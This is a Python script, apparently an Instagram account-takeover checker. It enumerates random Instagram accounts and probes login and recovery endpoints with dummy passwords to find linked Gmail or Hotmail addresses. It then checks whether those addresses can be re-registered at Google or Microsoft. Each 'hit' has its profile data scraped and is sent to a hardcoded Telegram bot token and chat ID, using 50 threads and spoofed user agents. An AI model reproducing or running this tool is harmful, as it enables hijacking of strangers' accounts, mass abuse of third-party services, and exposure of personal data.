from hashlib import md5
from time import time
import requests
from uuid import uuid4
import os
from random import choice, randrange
import sys
from threading import Thread
from user_agent import generate_user_agent
import time as time_module
import urllib.parse

class qredes:
    def __init__(self):
        self.hits = 0
        self.bad_email = 0
        self.bad_instgram = 0
        self.good_insgram = 0
        
        # Hardcoded credentials for Render deployment
        self.token = '7202127091:AAF3XLy98CNDAOI_0X-CneQrhITwHTOamgg'
        self.id = '7746909110'
        
        print('[+] Starting Instagram Account Checker...')
        
        # Send startup message to Telegram
        startup_msg = '''
🚀 BOT STARTED SUCCESSFULLY! 🚀
━━━━━━━━━━━━━━━━
✅ Bot is now running on Render
✅ Searching for available accounts
✅ Will notify you of any hits

Status: ACTIVE 🟢
By: @armann_olds
━━━━━━━━━━━━━━━━
'''
        self.send_telegram(startup_msg)
        print('[+] Startup message sent to Telegram')
        
        # Initialize hotmail tokens
        self.initialize_hotmail()
        
        print('[+] Initialization complete. Starting threads...')
        # Start worker threads
        for i in range(50):
            Thread(target=self.home, daemon=True).start()
        
        print(f'[+] Started 50 worker threads')
        
        # Keep main thread alive
        try:
            while True:
                time_module.sleep(60)
                # Send status update every hour
                if int(time()) % 3600 < 60:
                    status_msg = f'''
📊 HOURLY STATUS UPDATE
━━━━━━━━━━━━━━━━
✅ Hits Found: {self.hits}
📧 Bad Emails: {self.bad_email}
📱 Good Instagram: {self.good_insgram}
❌ Bad Instagram: {self.bad_instgram}
━━━━━━━━━━━━━━━━
Status: RUNNING 🟢
'''
                    self.send_telegram(status_msg)
        except KeyboardInterrupt:
            print('\n[!] Shutting down...')

    def initialize_hotmail(self):
        retry_count = 0
        max_retries = 5
        while retry_count < max_retries:
            try:
                headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'en-US,en;q=0.9',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
                }
                response = requests.get('https://signup.live.com/signup', headers=headers, timeout=10)
                canary = str.encode(response.text.split('"apiCanary":"')[1].split('"')[0]).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii")
                self.amsc = response.cookies.get_dict()['amsc']
                
                cookies = {
                    'amsc': self.amsc,
                }
                headers = {
                    'accept': 'application/json',
                    'accept-language': 'en-US,en;q=0.9',
                    'canary': canary,
                    'content-type': 'application/json; charset=utf-8',
                    'origin': 'https://signup.live.com',
                    'referer': 'https://signup.live.com/',
                    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
                }
                json_data = {
                    'clientExperiments': [
                        {
                            'parallax': 'enableplaintextforsignupexperiment',
                            'control': 'enableplaintextforsignupexperiment_control',
                            'treatments': [
                                'enableplaintextforsignupexperiment_treatment',
                            ],
                        },
                    ],
                }
                response = requests.post(
                    'https://signup.live.com/API/EvaluateExperimentAssignments',
                    cookies=cookies,
                    headers=headers,
                    json=json_data,
                    timeout=10
                ).json()
                self.canary = response['apiCanary']
                print('[+] Hotmail tokens initialized successfully')
                break
            except Exception as e:
                retry_count += 1
                print(f'[!] Error getting hotmail tokens (attempt {retry_count}/{max_retries}): {str(e)}')
                time_module.sleep(3)
                if retry_count >= max_retries:
                    print('[!] Failed to initialize hotmail tokens, continuing anyway...')
                    self.amsc = None
                    self.canary = None

    def send_telegram(self, message):
        """Send message to Telegram with retries"""
        max_retries = 3
        for attempt in range(max_retries):
            try:
                encoded_message = urllib.parse.quote(message)
                url = f'https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.id}&text={encoded_message}'
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    print('[✓] Message sent to Telegram successfully!')
                    return True
                else:
                    print(f'[!] Telegram API returned status {response.status_code}')
            except Exception as e:
                print(f'[!] Error sending to Telegram (attempt {attempt+1}/{max_retries}): {str(e)}')
                time_module.sleep(2)
        return False

    def insta1(self, email):
        try:
            csrftoken = md5(str(time()).encode()).hexdigest()
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/?lang=en-US&hl=en-gb',
                'user-agent': 'Mozilla/5.0 (Linux; Android 13; ANY-LX2 Build/HONORANY-L22CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6422.147 Mobile Safari/537.36 InstagramLite 1.0.0.0.145 Android (33/13; 480dpi; 1080x2298; HONOR; ANY-LX2; HNANY-Q1; qcom; ar_IQ_#u-nu-latn; 115357035)',
                'x-csrftoken': csrftoken,
            }
            data = {
                'username': email,
            }
            response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', 
                                    headers=headers, data=data, timeout=10).text
            
            # Check for account existence indicators
            if 'showAccountRecoveryModal' in response:
                return True
            if 'user_id' in response:
                return True
            if 'authenticated' in response:
                return True
                
            return False
        except Exception as e:
            return False

    def insta2(self, email):
        try:
            url = 'https://b.i.instagram.com/api/v1/accounts/login/'
            headers = {
                'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
                'Accept': '*/*',
                'Cookie': 'missing',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US',
                'X-IG-Capabilities': '3brTvw==',
                'X-IG-Connection-Type': 'WIFI',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Host': 'i.instagram.com'
            }
            uid = str(uuid4())
            data = {
                'uuid': uid,
                'password': 'testpassword123',
                'username': email,
                'device_id': uid,
                'from_reg': 'false',
                '_csrftoken': 'missing',
                'login_attempt_count': '0'
            }
            re = requests.post(url, headers=headers, data=data, timeout=10).text
            
            # If we get bad_password, the account exists
            if 'bad_password' in re:
                return True
            if 'user_id' in re:
                return True
            if 'logged_in_user' in re:
                return True
                
            return False
        except Exception as e:
            return False

    def check_gmail(self, email):
        try:
            username = email.split('@')[0] if '@' in email else email
            tim = str(int(time()))
            
            headers = {
                'authority': 'accounts.google.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'origin': 'https://accounts.google.com',
                'referer': 'https://accounts.google.com/',
                'user-agent': generate_user_agent(),
                'x-same-domain': '1',
            }
            
            # Check if Gmail is available
            params = {
                'biz': 'false',
                'continue': 'https://mail.google.com/mail/',
                'ddm': '0',
                'dsh': f'S-{tim}:1722139307145196',
                'flowEntry': 'SignUp',
                'flowName': 'GlifWebSignIn',
            }
            
            data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{username}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C0%2C3948%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&'
            
            response = requests.post(
                'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
                params=params,
                headers=headers,
                data=data,
                timeout=10
            ).text
            
            # If response contains these, email is likely available
            if 'signup' in response or 'TL' in response:
                return True
            
            return False
        except Exception as e:
            return False

    def check_hotmail(self, email):
        if not self.amsc or not self.canary:
            return False
            
        try:
            cookies = {
                'amsc': self.amsc,
            }
            headers = {
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'canary': self.canary,
                'content-type': 'application/json; charset=utf-8',
                'origin': 'https://signup.live.com',
                'referer': 'https://signup.live.com/',
                'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            }
            json_data = {
                'signInName': email,
            }
            response = requests.post('https://signup.live.com/API/CheckAvailableSigninNames', 
                                    cookies=cookies, headers=headers, json=json_data, timeout=10).text
            if '"isAvailable":true' in response:
                return True
            return False
        except Exception as e:
            return False

    def get_info(self, username, domen):
        try:
            headers = {
                'X-Pigeon-Session-Id': str(uuid4()),
                'X-Pigeon-Rawclienttime': str(time()),
                'X-IG-Connection-Speed': '-1kbps',
                'X-IG-Bandwidth-Speed-KBPS': '-1.000',
                'X-IG-Bandwidth-TotalBytes-B': '0',
                'X-IG-Bandwidth-TotalTime-MS': '0',
                'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
                'X-IG-Connection-Type': 'WIFI',
                'X-IG-Capabilities': '3brTvw==',
                'X-IG-App-ID': '567067343352427',
                'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
                'Accept-Language': 'en-GB, en-US',
                'Cookie': f'mid={md5(str(time()).encode()).hexdigest()}; csrftoken={md5(str(time()).encode()).hexdigest()}',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Host': 'i.instagram.com',
                'X-FB-HTTP-Engine': 'Liger',
                'Connection': 'keep-alive',
            }
            
            csrf = md5(str(time()).encode()).hexdigest()
            data = {
                'signed_body': f'{md5(str(time()).encode()).hexdigest()}.{{"_csrftoken":"{csrf}","adid":"{str(uuid4())}","guid":"{str(uuid4())}","device_id":"android-{md5(str(time()).encode()).hexdigest()[:16]}","query":"{username}"}}',
                'ig_sig_key_version': '4',
            }
            
            rest = None
            try:
                response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', 
                                        headers=headers, data=data, timeout=10)
                rest = response.json().get('email', None)
            except:
                pass
            
            # Get Instagram profile info
            headers = {
                'accept': '*/*',
                'accept-language': 'en',
                'referer': f'https://www.instagram.com/{username}/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                'x-ig-app-id': '936619743392459',
                'x-requested-with': 'XMLHttpRequest',
            }
            params = {
                'username': username,
            }
            
            followerNum = followingNum = postNum = 'N/A'
            isPraise = full_name = biography = id = 'N/A'
            date = 'N/A'
            
            try:
                response = requests.get(
                    'https://www.instagram.com/api/v1/users/web_profile_info/',
                    params=params,
                    headers=headers,
                    timeout=10
                ).json()
                
                user_data = response.get('data', {}).get('user', {})
                followerNum = user_data.get('edge_followed_by', {}).get('count', 'N/A')
                followingNum = user_data.get('edge_follow', {}).get('count', 'N/A')
                postNum = user_data.get('edge_owner_to_timeline_media', {}).get('count', 'N/A')
                isPraise = user_data.get('is_private', 'N/A')
                full_name = user_data.get('full_name', 'N/A')
                biography = user_data.get('biography', 'N/A')
                id = user_data.get('id', 'N/A')
                
                if id and id != 'N/A':
                    try:
                        date = requests.get(f'https://mel7n.pythonanywhere.com/?id={id}', timeout=5).json().get('date', 'N/A')
                    except:
                        pass
            except:
                pass
            
        except Exception as e:
            followerNum = followingNum = postNum = 'N/A'
            isPraise = full_name = biography = id = rest = date = 'N/A'
        
        info = f'''
⌯ Hi Arman Got Hit
ᯓᯓᯓᯓᯓᯓᯓᯓ
folowers : {followerNum}
following : {followingNum}
total posts : {postNum}
isPraise : {isPraise}
username : {username}
email : {username}@{domen}
date : {date}
id : {id}
full name : {full_name}
bio : {biography}
rest : {rest}
ᯓᯓᯓᯓᯓᯓᯓᯓ
by : @armann_olds
'''
        
        print(info)
        
        # Save to file
        try:
            with open('hits.txt', 'a', encoding='utf-8') as f:
                f.write(info + '\n')
        except:
            pass
        
        # Send to Telegram
        self.send_telegram(info)

    def get_username(self):
        try:
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'priority': 'u=1, i',
                'sec-ch-ua': '"Chromium";v="125", "Not.A/Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
                'x-asbd-id': '129477',
                'x-csrftoken': md5(str(time()).encode()).hexdigest(),
                'x-ig-app-id': '936619743392459',
            }
            
            random_id = randrange(1, 60000000000)
            
            data = {
                'variables': f'{{"id":"{random_id}","render_surface":"PROFILE"}}',
                'doc_id': '7663723823674585',
            }
            
            response = requests.post('https://www.instagram.com/graphql/query', 
                                    headers=headers, data=data, timeout=10).json()
            
            username = response.get('data', {}).get('user', {}).get('username')
            
            if username:
                return [username]
            return None
            
        except Exception as e:
            return None

    def home(self):
        while True:
            try:
                sys.stdout.write(f'\r[Stats] Hits: {self.hits} | Bad IG: {self.bad_instgram} | Bad Email: {self.bad_email} | Good IG: {self.good_insgram}')
                sys.stdout.flush()

                # Get username
                usernames = self.get_username()
                if not usernames:
                    time_module.sleep(2)
                    continue
                
                for username in usernames:
                    # Check both Gmail and Hotmail
                    email1 = f'{username}@gmail.com'
                    email2 = f'{username}@hotmail.com'
                    
                    # Use both methods for Instagram check
                    api1 = choice('12')
                    api2 = choice('12')
                    
                    # Check Gmail
                    try:
                        if api1 == '1':
                            s11 = self.insta1(email1)
                        else:
                            s11 = self.insta2(email1)
                            
                        if s11:
                            self.good_insgram += 1
                            qq = self.check_gmail(email1)
                            if qq:
                                self.hits += 1
                                print(f'\n[🎯 HIT!] Found: {email1}')
                                self.get_info(username, 'gmail.com')
                            else:
                                self.bad_email += 1
                        else:
                            self.bad_instgram += 1
                    except Exception as e:
                        self.bad_instgram += 1
                    
                    time_module.sleep(0.3)
                    
                    # Check Hotmail
                    try:
                        if api2 == '1':
                            s22 = self.insta1(email2)
                        else:
                            s22 = self.insta2(email2)
                            
                        if s22:
                            self.good_insgram += 1
                            qq = self.check_hotmail(email2)
                            if qq:
                                self.hits += 1
                                print(f'\n[🎯 HIT!] Found: {email2}')
                                self.get_info(username, 'hotmail.com')
                            else:
                                self.bad_email += 1
                        else:
                            self.bad_instgram += 1
                    except Exception as e:
                        self.bad_instgram += 1
                    
                    time_module.sleep(0.5)
                    
            except Exception as e:
                time_module.sleep(3)


if __name__ == '__main__':
    print('='*50)
    print('Instagram Account Checker - Starting...')
    print('='*50)
    qredes()
